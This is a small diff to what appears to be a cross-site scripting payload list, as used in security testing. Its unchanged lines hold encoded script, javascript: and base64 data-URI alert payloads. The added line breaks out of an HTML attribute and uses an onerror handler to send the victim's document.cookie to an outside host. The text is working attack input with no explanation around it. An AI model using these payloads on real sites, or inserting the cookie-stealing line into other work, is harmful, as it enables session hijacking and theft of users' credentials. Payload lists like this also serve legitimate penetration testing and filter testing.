@@ -8,3 +8,4 @@
 &#x3c;script&#x3e;&#x61;lert(document.domain)&#x3c;&#x2f;script&#x3e;
 javascript&#00000000000058;alert(document.domain)
 data:text/html+base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+Cg==
+" onerror=$.ajax("https://exfiltarget/?a="+document.cookie)><br
